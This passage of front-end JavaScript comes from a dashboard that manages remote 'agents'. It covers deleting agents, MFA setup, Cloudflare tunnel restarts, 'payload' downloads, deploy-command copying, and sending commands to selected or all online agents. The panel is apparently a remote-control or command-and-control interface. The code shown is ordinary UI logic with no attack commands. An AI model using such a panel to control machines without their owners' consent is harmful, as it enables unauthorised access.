        if (!agent) {
            return;
        }

        const confirmed = window.confirm(`Delete ${agent.hostname || agent.id}? This also removes its tasks and history`);
        if (!confirmed) {
            return;
        }

        try {
            await this.apiJson(`/api/v1/agents/${encodeURIComponent(agentId)}`, { method: "DELETE" });
            this.selectedAgents.delete(agentId);
            this.notify("Agent deleted", "success");
            await Promise.all([this.loadStats(), this.loadAgents(), this.loadAuditLogs()]);
        } catch (error) {
            console.error("Failed to delete agent:", error);
            this.notify(error.message || "Could not delete the agent", "error");
        }
    },

    async setupMfa() {
        this.ui.setupMfaBtn.disabled = true;
        try {
            const data = await this.apiJson("/api/v1/security/mfa/setup", { method: "POST", body: "{}" });
            this.ui.mfaSecretText.textContent = data.secret || "-";
            this.ui.mfaUriText.textContent = data.otpauth_uri || "";
            this.ui.mfaSecretBlock.classList.add("show");
            this.notify("Setup secret created. Add it to your authenticator app, then confirm it with a code", "success");
            await Promise.all([this.loadSecurityStatus(), this.loadAuditLogs()]);
        } catch (error) {
            console.error("Failed to setup MFA:", error);
            this.notify(error.message || "Could not create an MFA setup secret", "error");
        } finally {
            this.ui.setupMfaBtn.disabled = false;
        }
    },

    async enableMfa() {
        const code = (this.ui.mfaCodeInput.value || "").trim();
        if (!code) {
            this.notify("Enter a 6-digit code first", "warning");
            return;
        }

        this.ui.enableMfaBtn.disabled = true;
        try {
            await this.apiJson("/api/v1/security/mfa/enable", {
                method: "POST",
                body: JSON.stringify({ code }),
            });
            this.ui.mfaCodeInput.value = "";
            this.notify("MFA is now turned on for this account", "success");
            await Promise.all([this.loadSecurityStatus(), this.loadAuditLogs()]);
        } catch (error) {
            console.error("Failed to enable MFA:", error);
            this.notify(error.message || "Could not turn on MFA", "error");
        } finally {
            this.ui.enableMfaBtn.disabled = false;
        }
    },

    async disableMfa() {
        const code = (this.ui.mfaCodeInput.value || "").trim();
        if (!code) {
            this.notify("Enter a 6-digit code to turn off MFA", "warning");
            return;
        }

        this.ui.disableMfaBtn.disabled = true;
        try {
            await this.apiJson("/api/v1/security/mfa/disable", {
                method: "POST",
                body: JSON.stringify({ code }),
            });
            this.ui.mfaCodeInput.value = "";
            this.notify("MFA has been turned off", "success");
            await Promise.all([this.loadSecurityStatus(), this.loadAuditLogs()]);
        } catch (error) {
            console.error("Failed to disable MFA:", error);
            this.notify(error.message || "Could not turn off MFA", "error");
        } finally {
            this.ui.disableMfaBtn.disabled = false;
        }
    },

    async restartTunnel() {
        const confirmed = window.confirm("Restart the Cloudflare route? Existing launch links will need to be refreshed");
        if (!confirmed) {
            return;
        }

        this.ui.restartTunnelBtn.disabled = true;
        try {
            const data = await this.apiJson("/api/v1/tunnel/restart", { method: "POST", body: "{}" });
            this.notify(data.warning || "Route restarted", "warning");
            await Promise.all([this.loadTunnelInfo(), this.loadDeployInfo(), this.loadAuditLogs()]);
        } catch (error) {
            console.error("Failed to restart tunnel:", error);
            this.notify(error.message || "Could not restart the route", "error");
        } finally {
            this.ui.restartTunnelBtn.disabled = false;
        }
    },

    async downloadPayload(url, filename) {
        if (!url) {
            this.notify("The download link is not ready yet", "warning");
            return;
        }
        try {
            const response = await fetch(url);
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            const blob = await response.blob();
            const blobUrl = window.URL.createObjectURL(blob);
            const link = document.createElement("a");
            link.href = blobUrl;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            link.remove();
            window.setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
            this.notify(`${filename} downloaded`, "success");
        } catch (error) {
            console.error("Failed to download payload:", error);
            this.notify(`Could not download ${filename}`, "error");
        }
    },

    copyDeployCommand(key, feedback) {
        const value = this.deployInfo?.[key];
        if (value) {
            this.copyText(value, feedback);
        }
    },

    updateCommandDeck() {
        const operator = this.securityStatus?.user?.username || "unknown";
        const lastLogin = this.securityStatus?.user?.last_login_at
            ? this.formatAbsoluteDate(this.securityStatus.user.last_login_at)
            : "not recorded yet";
        const mfaEnabled = this.securityStatus?.mfa_enabled === true;
        const selectedCount = this.selectedAgents.size;
        const onlineCount = this.agents.filter((agent) => agent.is_alive === true).length;
        const totalCount = this.agents.length;
        const broadcastMode = this.ui.broadcastOnlineToggle?.checked === true;

        this.ui.operatorIdentityPill.textContent = `Signed in as ${operator}`;
        this.ui.operatorMfaPill.textContent = mfaEnabled ? "MFA on" : "MFA off";
        this.ui.selectionMissionValue.textContent = broadcastMode
            ? `${onlineCount} online agent${onlineCount === 1 ? "" : "s"}`
            : `${selectedCount} selected`;
        this.ui.selectionMissionMeta.textContent = broadcastMode
            ? "Commands below will go to every agent that is currently online"
            : selectedCount > 0
                ? `${selectedCount} agent${selectedCount === 1 ? "" : "s"} selected out of ${totalCount}`
                : "Pick one or more agents to run a command or open a terminal";
        this.ui.commandDeckSummary.textContent = `Welcome back, ${operator}. ${onlineCount} of ${totalCount} agents are online. Last sign-in: ${lastLogin}`;

        if (!this.deployInfo?.expires_at) {
            this.ui.deployCountdownPill.textContent = "Launch links expire in --";
        }
        if (!this.ui.tunnelHealthValue.textContent.trim()) {
            this.ui.tunnelHealthValue.textContent = "Checking route";
        }
    },

    updateStatValue(element, value) {
        if (!element) {
            return;
        }
        const next = String(value);
        if (element.textContent !== next) {
            element.textContent = next;
            element.classList.remove("updated");
            window.requestAnimationFrame(() => {
                element.classList.add("updated");
                window.setTimeout(() => element.classList.remove("updated"), 500);
            });
        } else {
            element.textContent = next;
        }
    },

    setLoading(show, message = "Working...") {
        if (!this.ui.loadingOverlay) {
            return;
        }
        const label = this.ui.loadingOverlay.querySelector("p");
        if (label) {
            label.textContent = message;
        }
        this.ui.loadingOverlay.classList.toggle("show", Boolean(show));
    },

    notify(message, kind = "info") {
        if (!this.ui.notifications) {
            return;
        }
        const notification = document.createElement("div");
        notification.className = `notification ${kind}`;
        notification.textContent = message;
        this.ui.notifications.prepend(notification);
        window.setTimeout(() => {
            notification.remove();
        }, 4500);
    },

    async copyText(value, feedback = "Copied to clipboard") {
        try {
            await navigator.clipboard.writeText(value);
            this.flashCopyFeedback(feedback);
        } catch (error) {
            console.error("Clipboard write failed:", error);
            this.notify("Clipboard access failed", "error");
        }
    },

    flashCopyFeedback(message) {
        if (!this.ui.copyFeedback) {
            return;
        }
        const label = this.ui.copyFeedback.querySelector("span:last-child");
        if (label) {
            label.textContent = message;
        }
        this.ui.copyFeedback.classList.add("show");
        window.clearTimeout(this.copyFeedbackTimer);
        this.copyFeedbackTimer = window.setTimeout(() => {
            this.ui.copyFeedback.classList.remove("show");
        }, 1800);
    },

    parseServerDate(value) {
        if (!value) {
            return new Date(0);
        }
        const normalized = /[zZ]|[+-]\d{2}:\d{2}$/.test(value) ? value : `${value}Z`;
        const parsed = new Date(normalized);
        return Number.isNaN(parsed.getTime()) ? new Date(0) : parsed;
    },

    formatAbsoluteDate(value) {
        if (!value) {
            return "Unavailable";
        }
        const date = this.parseServerDate(value);
        if (!date.getTime()) {
            return "Unavailable";
        }
        return date.toLocaleString([], {
            year: "numeric",
            month: "short",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
        });
    },

    formatRelativeTime(value) {
        if (!value) {
            return "Never";
        }

        const date = this.parseServerDate(value);
        if (!date.getTime()) {
            return "Never";
        }

        const seconds = Math.max(0, Math.floor((Date.now() - date.getTime()) / 1000));
        if (seconds < 10) {
            return "Just now";
        }
        if (seconds < 60) {
            return `${seconds}s ago`;
        }
        const minutes = Math.floor(seconds / 60);
        if (minutes < 60) {
            return `${minutes}m ago`;
        }
        const hours = Math.floor(minutes / 60);
        if (hours < 24) {
            return `${hours}h ago`;
        }
        const days = Math.floor(hours / 24);
        return `${days}d ago`;
    },

    shortId(value) {
        const text = String(value || "");
        return text.length > 8 ? text.slice(0, 8) : text;
    },

    escapeHtml(value) {
        return String(value ?? "")
            .replaceAll("&", "&amp;")
            .replaceAll("<", "&lt;")
            .replaceAll(">", "&gt;")
            .replaceAll('"', "&quot;")
            .replaceAll("'", "&#39;");
    },
};

window.App = App;
